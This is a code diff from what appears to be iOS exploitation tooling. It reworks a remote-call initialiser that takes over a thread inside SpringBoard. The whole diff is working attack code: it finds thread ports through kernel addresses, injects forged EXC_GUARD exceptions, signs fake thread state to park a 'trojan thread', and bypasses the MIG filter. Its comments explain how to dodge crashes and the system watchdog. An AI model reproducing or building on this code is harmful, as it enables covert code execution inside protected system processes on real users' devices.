@@ -1879,33 +1879,40 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         RC_DIAG("iOS26+ pthread stubs — skipping create+sleep; trying thread[1] reuse");
     }
 
+    // Prefer a real suspended create when we have a SB-side pthread port.
+    // Otherwise reuse inject thread[1]: SB usually has NO mach port name for
+    // that kernel thread in its own ipc_space, so task_find_port_for_thread
+    // returns 0 (log: reuse failed). Falling back to originalThreadOnly parks
+    // MAIN at FAKE_LR → IPS SIGBUS PC=LR=0x201. Park via EXC_GUARD inject +
+    // reply_with_state instead (same mechanism as creator trap; no port needed).
+    bool parkedViaGuard = false;
     if (!callThreadPort) {
-        if (g_RC_threadList.count >= 2) {
-            uint64_t thread2Addr = g_RC_threadList[1].unsignedLongLongValue;
-            if (is_kaddr_valid(thread2Addr)) {
-                callThreadPort = task_find_port_for_thread(g_RC_taskAddr, thread2Addr);
-                if (callThreadPort) {
-                    g_RC_callThreadAddr = thread2Addr;
-                    RC_DIAG("thread[1] reuse addr=0x%llx port=0x%llx",
-                            (unsigned long long)thread2Addr, (unsigned long long)callThreadPort);
-                }
-            }
-        }
-        if (!callThreadPort) {
-            RC_DIAG("thread[1] reuse failed — falling back to originalThreadOnly");
-            g_RC_creatingExtraThread = false;
-            g_RC_pid = (int)targetPid;
-            return 0;
-        }
-        // Reused live inject thread — suspend before set_state/park.
-        uint64_t suspendRet = do_remote_call_temp(100, "thread_suspend", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
-        RC_DIAG("thread_suspend reused port=0x%llx ret=%llu",
-                (unsigned long long)callThreadPort, (unsigned long long)suspendRet);
-        if (!g_RC_success || suspendRet != 0) {
-            RC_DIAG("thread_suspend failed ret=%llu success=%d",
-                    (unsigned long long)suspendRet, (int)g_RC_success);
+        if (g_RC_threadList.count < 2) {
+            RC_DIAG("no inject thread[1] — cannot build extra call thread");
             fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
             return -1;
+        }
+        uint64_t thread2Addr = g_RC_threadList[1].unsignedLongLongValue;
+        if (!is_kaddr_valid(thread2Addr) || thread2Addr == g_RC_trojanThreadAddr) {
+            RC_DIAG("thread[1] invalid/same-as-signer addr=0x%llx trojan=0x%llx",
+                    (unsigned long long)thread2Addr,
+                    (unsigned long long)g_RC_trojanThreadAddr);
+            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+            return -1;
+        }
+        g_RC_callThreadAddr = thread2Addr;
+        callThreadPort = task_find_port_for_thread(g_RC_taskAddr, thread2Addr);
+        RC_DIAG("thread[1] reuse addr=0x%llx port=0x%llx (0=use GUARD park)",
+                (unsigned long long)thread2Addr, (unsigned long long)callThreadPort);
+
+        if (callThreadPort) {
+            uint64_t suspendRet = do_remote_call_temp(100, "thread_suspend", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+            RC_DIAG("thread_suspend reused port=0x%llx ret=%llu",
+                    (unsigned long long)callThreadPort, (unsigned long long)suspendRet);
+            if (!g_RC_success || suspendRet != 0) {
+                RC_DIAG("thread_suspend failed — falling back to GUARD park");
+                callThreadPort = 0;
+            }
         }
     }
 
@@ -1932,10 +1939,9 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if(useMigFilterBypass)
         mig_bypass_pause();
 
-    // Suspended (create or explicit). Park at FAKE_PC_TROJAN so resume -> 0x301
-    // SIGBUS into our exception handler (Fl0rk/Cyanide shape).
     (void)createdSuspended;
-    {
+    if (callThreadPort) {
+        // Suspended create/reuse with a usable port — park via thread_set_state.
         arm_thread_state64_internal park = {0};
         uint64_t stateBuf = do_remote_call_temp(100, "malloc",
                                                 sizeof(arm_thread_state64_internal),
@@ -1961,19 +1967,48 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
             return -1;
         }
-    }
 
-    RC_DEBUG("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);
+        RC_DEBUG("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);
+        uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+        if (ret != 0) {
+            RC_DIAG("thread_resume synthetic failed ret=%llu (no originalThreadOnly fallback)",
+                    (unsigned long long)ret);
+            fail_after_creator_park(RemoteCallInitFailureThreadResume, targetPid);
+            return -1;
+        }
+    } else {
+        // No SB port for thread[1]. Inject EXC_GUARD into thread[1] (already has
+        // secondExceptionPort). Wait on second port, reply park at 0x301/0x401.
+        // Never originalThreadOnly on SpringBoard (SIGBUS 0x201 / WATCHDOG).
+        mach_exception_code_t parkGuard = 0;
+        EXC_GUARD_ENCODE_TYPE(parkGuard, GUARD_TYPE_MACH_PORT);
+        EXC_GUARD_ENCODE_FLAVOR(parkGuard, kGUARD_EXC_INVALID_RIGHT);
+        EXC_GUARD_ENCODE_TARGET(parkGuard, 0xf504ULL);
 
-    uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
-    if (ret != 0) {
-        // Do NOT fall back to originalThreadOnly — for SpringBoard that parks
-        // main at FAKE_PC between calls and trips backboardd WATCHDOG.
-        RC_DIAG("thread_resume synthetic failed ret=%llu (no originalThreadOnly fallback)",
-                (unsigned long long)ret);
-        fail_after_creator_park(RemoteCallInitFailureThreadResume, targetPid);
-        return -1;
+        if (!inject_guard_exception(g_RC_callThreadAddr, parkGuard)) {
+            RC_DIAG("GUARD inject on thread[1] failed addr=0x%llx",
+                    (unsigned long long)g_RC_callThreadAddr);
+            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+            return -1;
+        }
+        RC_DIAG("GUARD inject on thread[1]=0x%llx — waiting secondExceptionPort",
+                (unsigned long long)g_RC_callThreadAddr);
+
+        ExceptionMessage parkExc;
+        memset(&parkExc, 0, sizeof(parkExc));
+        if (!wait_exception(secondExceptionPort, &parkExc, 5000, false)) {
+            clear_guard_exception(g_RC_callThreadAddr);
+            RC_DIAG("GUARD wait on thread[1] timed out");
+            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+            return -1;
+        }
+        clear_guard_exception(g_RC_callThreadAddr);
+        sign_state(g_RC_trojanThreadAddr, &parkExc.threadState, FAKE_PC_TROJAN, FAKE_LR_TROJAN);
+        reply_with_state(&parkExc, &parkExc.threadState);
+        parkedViaGuard = true;
+        RC_DIAG("parked thread[1] at 0x301 via GUARD reply (no port)");
     }
+    (void)parkedViaGuard;
 
     RC_DEBUG("[%s:%d] New thread created, resuming original\n", __FUNCTION__, __LINE__);
     if (!restore_trojan_thread(&g_RC_originalState)) {
